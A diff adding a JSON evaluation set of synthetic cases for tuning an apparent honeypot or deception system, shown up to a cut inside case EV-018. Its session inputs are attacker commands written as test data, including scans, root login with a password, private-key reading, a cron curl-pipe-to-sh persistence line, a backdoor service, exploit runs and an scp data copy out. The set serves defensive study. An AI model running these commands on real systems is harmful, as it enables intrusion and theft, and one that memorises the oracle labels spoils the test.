@@ -1,0 +1,2542 @@
+{
+  "schema": "ragin.laya_v3.calibration_tuning.ev_set_freeze.v1",
+  "status": "FROZEN_BEFORE_TRAINING_CALLS",
+  "date": "2026-10-16",
+  "study": "laya_v3_calibration_tuning_v1",
+  "oracle_type": "synthetic_contract_oracle_not_real_world_ground_truth",
+  "oracle_policy": "Synthetic contract oracles written before any training or evaluation call; not real-world truth labels. All case texts are new material authored for this study and were not used by prior studies.",
+  "case_count": 40,
+  "cases": [
+    {
+      "case_id": "EV-001",
+      "name": "sufficient_recon",
+      "archetype": "sufficient",
+      "scenario": "recon",
+      "state": {
+        "session": {
+          "current_input": "masscan -p1-65535 --rate=1500 172.16.132.0/24"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.56,
+          "observed_techniques": [
+            "T1046"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0043"
+          ],
+          "observed_ttps": [
+            "T1046"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Recon Surface Expansion",
+              "content_excerpt": "Sequential host and service enumeration across 10.77.85 is consistent with deliberate reconnaissance and is best answered by expanding the decoy recon surface.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.9
+            },
+            {
+              "doc_id": "D2",
+              "title": "Staged Scanning Behavior",
+              "content_excerpt": "The observed scan cadence from 10.55.195.123 matches staged discovery; sustaining a broad decoy surface keeps the intruder engaged and observable.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.86
+            },
+            {
+              "doc_id": "D3",
+              "title": "Network Inventory Sync",
+              "content_excerpt": "The asset inventory service refreshed host records for 10.77.85 overnight.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.19
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "maximize_recon_surface"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-002",
+      "name": "sufficient_recon",
+      "archetype": "sufficient",
+      "scenario": "recon",
+      "state": {
+        "session": {
+          "current_input": "ffuf -u http://10.20.130.15/FUZZ -w /opt/wordlists/common.txt -t 40"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.58,
+          "observed_techniques": [
+            "T1046",
+            "T1595"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0043"
+          ],
+          "observed_ttps": [
+            "T1046",
+            "T1595"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Recon Surface Expansion",
+              "content_excerpt": "Sequential host and service enumeration across 10.20.168 is consistent with deliberate reconnaissance and is best answered by expanding the decoy recon surface.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.9
+            },
+            {
+              "doc_id": "D2",
+              "title": "Staged Scanning Behavior",
+              "content_excerpt": "The observed scan cadence from 172.16.85.4 matches staged discovery; sustaining a broad decoy surface keeps the intruder engaged and observable.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.82
+            },
+            {
+              "doc_id": "D3",
+              "title": "Baseline Hardening Policy",
+              "content_excerpt": "The benchmark hardening profile applies industry-standard controls to all managed hosts.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.41
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "maximize_recon_surface"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-003",
+      "name": "sufficient_recon",
+      "archetype": "sufficient",
+      "scenario": "recon",
+      "state": {
+        "session": {
+          "current_input": "nmap -sV -sC -O 192.168.50.10"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.85,
+          "observed_techniques": [
+            "T1046"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0043"
+          ],
+          "observed_ttps": [
+            "T1046"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Recon Surface Expansion",
+              "content_excerpt": "Sequential host and service enumeration across 10.20.180 is consistent with deliberate reconnaissance and is best answered by expanding the decoy recon surface.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.89
+            },
+            {
+              "doc_id": "D2",
+              "title": "Staged Scanning Behavior",
+              "content_excerpt": "The observed scan cadence from 192.168.90.132 matches staged discovery; sustaining a broad decoy surface keeps the intruder engaged and observable.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.85
+            },
+            {
+              "doc_id": "D3",
+              "title": "Certificate Renewal Log",
+              "content_excerpt": "TLS certificate renewal for web-01 succeeded during the low-traffic window.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.23
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "maximize_recon_surface"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-004",
+      "name": "sufficient_single_recon",
+      "archetype": "sufficient_single",
+      "scenario": "recon",
+      "state": {
+        "session": {
+          "current_input": "nc -zv 10.20.47.20 1-500"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.88,
+          "observed_techniques": [
+            "T1046"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0043"
+          ],
+          "observed_ttps": [
+            "T1046"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Recon Surface Expansion",
+              "content_excerpt": "Sequential host and service enumeration across 172.16.157 is consistent with deliberate reconnaissance and is best answered by expanding the decoy recon surface.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.94
+            },
+            {
+              "doc_id": "D2",
+              "title": "VPN Access Logs",
+              "content_excerpt": "VPN authentication records for admin-l within the window show no anomalies.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.32
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "maximize_recon_surface"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-005",
+      "name": "sufficient_lowscore_recon",
+      "archetype": "sufficient_lowscore",
+      "scenario": "recon",
+      "state": {
+        "session": {
+          "current_input": "ffuf -u http://10.20.53.15/FUZZ -w /opt/wordlists/common.txt -t 40"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.73,
+          "observed_techniques": [
+            "T1046",
+            "T1595"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0043"
+          ],
+          "observed_ttps": [
+            "T1046",
+            "T1595"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Recon Surface Expansion",
+              "content_excerpt": "Sequential host and service enumeration across 172.16.42 is consistent with deliberate reconnaissance and is best answered by expanding the decoy recon surface.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.66
+            },
+            {
+              "doc_id": "D2",
+              "title": "Staged Scanning Behavior",
+              "content_excerpt": "The observed scan cadence from 172.16.69.125 matches staged discovery; sustaining a broad decoy surface keeps the intruder engaged and observable.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.59
+            },
+            {
+              "doc_id": "D3",
+              "title": "Baseline Hardening Policy",
+              "content_excerpt": "The benchmark hardening profile applies industry-standard controls to all managed hosts.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.41
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "maximize_recon_surface"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-006",
+      "name": "sufficient_credential",
+      "archetype": "sufficient",
+      "scenario": "credential",
+      "state": {
+        "session": {
+          "current_input": "sshpass -p 'Summer2026!' ssh root@10.20.64.30"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.8,
+          "observed_techniques": [
+            "T1552.001"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0006"
+          ],
+          "observed_ttps": [
+            "T1552.001"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Honeytoken Credential Path",
+              "content_excerpt": "Credential-focused activity from 172.16.120.26 is best steered toward the planted honeytoken credentials, which keep the intruder observable without exposing real secrets.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.89
+            },
+            {
+              "doc_id": "D2",
+              "title": "Decoy Secret Placement",
+              "content_excerpt": "The observed credential probing matches prior cases where directing the actor to decoy secrets converted the intrusion into a monitored channel.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.79
+            },
+            {
+              "doc_id": "D3",
+              "title": "Backup Verification",
+              "content_excerpt": "Nightly backup verification for web-01 completed with no failed volumes.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.28
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "steer_to_honeytoken_credentials"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-007",
+      "name": "sufficient_credential",
+      "archetype": "sufficient",
+      "scenario": "credential",
+      "state": {
+        "session": {
+          "current_input": "grep -rn 'password' /var/www/html/config/"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.72,
+          "observed_techniques": [
+            "T1110.001"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0006"
+          ],
+          "observed_ttps": [
+            "T1110.001"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Honeytoken Credential Path",
+              "content_excerpt": "Credential-focused activity from 172.16.117.245 is best steered toward the planted honeytoken credentials, which keep the intruder observable without exposing real secrets.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.9
+            },
+            {
+              "doc_id": "D2",
+              "title": "Decoy Secret Placement",
+              "content_excerpt": "The observed credential probing matches prior cases where directing the actor to decoy secrets converted the intrusion into a monitored channel.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.79
+            },
+            {
+              "doc_id": "D3",
+              "title": "VPN Access Logs",
+              "content_excerpt": "VPN authentication records for admin-l within the window show no anomalies.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.31
+            },
+            {
+              "doc_id": "D4",
+              "title": "Baseline Hardening Policy",
+              "content_excerpt": "The benchmark hardening profile applies industry-standard controls to all managed hosts.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.43
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "steer_to_honeytoken_credentials"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-008",
+      "name": "sufficient_credential",
+      "archetype": "sufficient",
+      "scenario": "credential",
+      "state": {
+        "session": {
+          "current_input": "cat ~/.ssh/id_rsa"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.64,
+          "observed_techniques": [
+            "T1552.001"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0006"
+          ],
+          "observed_ttps": [
+            "T1552.001"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Honeytoken Credential Path",
+              "content_excerpt": "Credential-focused activity from 10.77.18.69 is best steered toward the planted honeytoken credentials, which keep the intruder observable without exposing real secrets.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.91
+            },
+            {
+              "doc_id": "D2",
+              "title": "Decoy Secret Placement",
+              "content_excerpt": "The observed credential probing matches prior cases where directing the actor to decoy secrets converted the intrusion into a monitored channel.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.81
+            },
+            {
+              "doc_id": "D3",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for jump-04 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.16
+            },
+            {
+              "doc_id": "D4",
+              "title": "Backup Verification",
+              "content_excerpt": "Nightly backup verification for jump-04 completed with no failed volumes.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.26
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "steer_to_honeytoken_credentials"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-009",
+      "name": "sufficient_lowscore_credential",
+      "archetype": "sufficient_lowscore",
+      "scenario": "credential",
+      "state": {
+        "session": {
+          "current_input": "cat ~/.ssh/id_rsa"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.56,
+          "observed_techniques": [
+            "T1552.001"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0006"
+          ],
+          "observed_ttps": [
+            "T1552.001"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Honeytoken Credential Path",
+              "content_excerpt": "Credential-focused activity from 192.168.49.206 is best steered toward the planted honeytoken credentials, which keep the intruder observable without exposing real secrets.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.66
+            },
+            {
+              "doc_id": "D2",
+              "title": "Decoy Secret Placement",
+              "content_excerpt": "The observed credential probing matches prior cases where directing the actor to decoy secrets converted the intrusion into a monitored channel.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.55
+            },
+            {
+              "doc_id": "D3",
+              "title": "Change Management Windows",
+              "content_excerpt": "Scheduled maintenance windows for app-07 cover weekly patching of the base image.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.22
+            },
+            {
+              "doc_id": "D4",
+              "title": "Baseline Hardening Policy",
+              "content_excerpt": "The benchmark hardening profile applies industry-standard controls to all managed hosts.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.4
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "steer_to_honeytoken_credentials"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-010",
+      "name": "sufficient_persistence",
+      "archetype": "sufficient",
+      "scenario": "persistence",
+      "state": {
+        "session": {
+          "current_input": "crontab -l"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.85,
+          "observed_techniques": [
+            "T1053.003"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0003"
+          ],
+          "observed_ttps": [
+            "T1053.003"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Persistence Containment",
+              "content_excerpt": "Persistence attempts on ci-05 are best contained inside the fiction environment while instrumentation records each activation.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.84
+            },
+            {
+              "doc_id": "D2",
+              "title": "Fiction Instrumentation",
+              "content_excerpt": "The observed scheduled-task modification matches prior intrusion patterns; containing it in the fictional layer preserves observability.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.82
+            },
+            {
+              "doc_id": "D3",
+              "title": "Change Management Windows",
+              "content_excerpt": "Scheduled maintenance windows for ci-05 cover weekly patching of the base image.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.23
+            },
+            {
+              "doc_id": "D4",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for ci-05 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.16
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "contain_in_fiction_and_instrument"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-011",
+      "name": "sufficient_persistence",
+      "archetype": "sufficient",
+      "scenario": "persistence",
+      "state": {
+        "session": {
+          "current_input": "echo '* * * * * curl -s http://10.20.35.5/t.sh | sh' | crontab -"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.66,
+          "observed_techniques": [
+            "T1543.002"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0003"
+          ],
+          "observed_ttps": [
+            "T1543.002"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Persistence Containment",
+              "content_excerpt": "Persistence attempts on gw-08 are best contained inside the fiction environment while instrumentation records each activation.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.89
+            },
+            {
+              "doc_id": "D2",
+              "title": "Fiction Instrumentation",
+              "content_excerpt": "The observed scheduled-task modification matches prior intrusion patterns; containing it in the fictional layer preserves observability.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.82
+            },
+            {
+              "doc_id": "D3",
+              "title": "Proxy Cache Statistics",
+              "content_excerpt": "Edge proxy cache hit ratios for 192.168.121 remained within the expected band today.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.15
+            },
+            {
+              "doc_id": "D4",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for gw-08 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.17
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "contain_in_fiction_and_instrument"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-012",
+      "name": "sufficient_persistence",
+      "archetype": "sufficient",
+      "scenario": "persistence",
+      "state": {
+        "session": {
+          "current_input": "echo '* * * * * curl -s http://10.20.34.5/t.sh | sh' | crontab -"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.55,
+          "observed_techniques": [
+            "T1053.003"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0003"
+          ],
+          "observed_ttps": [
+            "T1053.003"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Persistence Containment",
+              "content_excerpt": "Persistence attempts on file-03 are best contained inside the fiction environment while instrumentation records each activation.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.88
+            },
+            {
+              "doc_id": "D2",
+              "title": "Fiction Instrumentation",
+              "content_excerpt": "The observed scheduled-task modification matches prior intrusion patterns; containing it in the fictional layer preserves observability.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.82
+            },
+            {
+              "doc_id": "D3",
+              "title": "Proxy Cache Statistics",
+              "content_excerpt": "Edge proxy cache hit ratios for 10.55.211 remained within the expected band today.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.17
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "contain_in_fiction_and_instrument"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-013",
+      "name": "sufficient_persistence",
+      "archetype": "sufficient",
+      "scenario": "persistence",
+      "state": {
+        "session": {
+          "current_input": "systemctl enable backdoor.service && systemctl daemon-reload"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.72,
+          "observed_techniques": [
+            "T1543.002"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0003"
+          ],
+          "observed_ttps": [
+            "T1543.002"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Persistence Containment",
+              "content_excerpt": "Persistence attempts on ci-05 are best contained inside the fiction environment while instrumentation records each activation.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.85
+            },
+            {
+              "doc_id": "D2",
+              "title": "Fiction Instrumentation",
+              "content_excerpt": "The observed scheduled-task modification matches prior intrusion patterns; containing it in the fictional layer preserves observability.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.78
+            },
+            {
+              "doc_id": "D3",
+              "title": "VPN Access Logs",
+              "content_excerpt": "VPN authentication records for operator within the window show no anomalies.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.31
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "contain_in_fiction_and_instrument"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-014",
+      "name": "sufficient_exploitation",
+      "archetype": "sufficient",
+      "scenario": "exploitation",
+      "state": {
+        "session": {
+          "current_input": "msfconsole -q -x 'use exploit/linux/http/acme_rce; set RHOSTS 10.20.146.40; run'"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.67,
+          "observed_techniques": [
+            "T1059.004"
+          ]
+        },
+        "don_analysis": {
+          "severity": "critical",
+          "tactics": [
+            "TA0001"
+          ],
+          "observed_ttps": [
+            "T1059.004"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Exploitation Containment",
+              "content_excerpt": "Successful exploitation activity against web-01 should be contained within the fictional environment while each post-exploitation action is instrumented.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.91
+            },
+            {
+              "doc_id": "D2",
+              "title": "Instrumented Fiction Boundary",
+              "content_excerpt": "The observed exploit chain matches prior contained incidents; keeping the actor inside the instrumented fiction preserves evidence quality.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.83
+            },
+            {
+              "doc_id": "D3",
+              "title": "Proxy Cache Statistics",
+              "content_excerpt": "Edge proxy cache hit ratios for 192.168.102 remained within the expected band today.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.16
+            },
+            {
+              "doc_id": "D4",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for web-01 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.19
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "contain_in_fiction_and_instrument"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-015",
+      "name": "sufficient_exploitation",
+      "archetype": "sufficient",
+      "scenario": "exploitation",
+      "state": {
+        "session": {
+          "current_input": "python3 CVE-2024-5101.py --rhost 10.20.203.40 --lhost 10.20.203.99"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.57,
+          "observed_techniques": [
+            "T1190"
+          ]
+        },
+        "don_analysis": {
+          "severity": "critical",
+          "tactics": [
+            "TA0001"
+          ],
+          "observed_ttps": [
+            "T1190"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Exploitation Containment",
+              "content_excerpt": "Successful exploitation activity against ci-05 should be contained within the fictional environment while each post-exploitation action is instrumented.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.93
+            },
+            {
+              "doc_id": "D2",
+              "title": "Instrumented Fiction Boundary",
+              "content_excerpt": "The observed exploit chain matches prior contained incidents; keeping the actor inside the instrumented fiction preserves evidence quality.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.85
+            },
+            {
+              "doc_id": "D3",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for ci-05 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.17
+            },
+            {
+              "doc_id": "D4",
+              "title": "Baseline Hardening Policy",
+              "content_excerpt": "The benchmark hardening profile applies industry-standard controls to all managed hosts.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.43
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "contain_in_fiction_and_instrument"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-016",
+      "name": "sufficient_exploitation",
+      "archetype": "sufficient",
+      "scenario": "exploitation",
+      "state": {
+        "session": {
+          "current_input": "msfconsole -q -x 'use exploit/linux/http/acme_rce; set RHOSTS 10.20.232.40; run'"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.69,
+          "observed_techniques": [
+            "T1190"
+          ]
+        },
+        "don_analysis": {
+          "severity": "critical",
+          "tactics": [
+            "TA0001"
+          ],
+          "observed_ttps": [
+            "T1190"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Exploitation Containment",
+              "content_excerpt": "Successful exploitation activity against gw-08 should be contained within the fictional environment while each post-exploitation action is instrumented.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.89
+            },
+            {
+              "doc_id": "D2",
+              "title": "Instrumented Fiction Boundary",
+              "content_excerpt": "The observed exploit chain matches prior contained incidents; keeping the actor inside the instrumented fiction preserves evidence quality.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.84
+            },
+            {
+              "doc_id": "D3",
+              "title": "Certificate Renewal Log",
+              "content_excerpt": "TLS certificate renewal for gw-08 succeeded during the low-traffic window.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.22
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "contain_in_fiction_and_instrument"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-017",
+      "name": "sufficient_exploitation",
+      "archetype": "sufficient",
+      "scenario": "exploitation",
+      "state": {
+        "session": {
+          "current_input": "python3 CVE-2024-5101.py --rhost 10.20.133.40 --lhost 10.20.133.99"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.79,
+          "observed_techniques": [
+            "T1059.004"
+          ]
+        },
+        "don_analysis": {
+          "severity": "critical",
+          "tactics": [
+            "TA0001"
+          ],
+          "observed_ttps": [
+            "T1059.004"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Exploitation Containment",
+              "content_excerpt": "Successful exploitation activity against file-03 should be contained within the fictional environment while each post-exploitation action is instrumented.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.88
+            },
+            {
+              "doc_id": "D2",
+              "title": "Instrumented Fiction Boundary",
+              "content_excerpt": "The observed exploit chain matches prior contained incidents; keeping the actor inside the instrumented fiction preserves evidence quality.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.86
+            },
+            {
+              "doc_id": "D3",
+              "title": "Proxy Cache Statistics",
+              "content_excerpt": "Edge proxy cache hit ratios for 192.168.232 remained within the expected band today.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.16
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "contain_in_fiction_and_instrument"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-018",
+      "name": "sufficient_data_access",
+      "archetype": "sufficient",
+      "scenario": "data_access",
+      "state": {
+        "session": {
+          "current_input": "scp -r /srv/exports auditor@10.20.162.77:/tmp/"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.84,
+          "observed_techniques": [
+            "T1560.001"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0009"
+          ],
+          "observed_ttps": [
+            "T1560.001"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Fake Success Staging",
+              "content_excerpt": "Collection activity against gw-08 is best answered with staged fake success so the actor returns to the observable collection path instead of seeking alternatives.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.88
+            },
+            {
+              "doc_id": "D2",
+              "title": "Return Visit Cycle",
+              "content_excerpt": "The observed archive staging matches the cycle that historically brings actors back to the instrumented share; sustaining the illusion keeps coverage.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.78
+            },
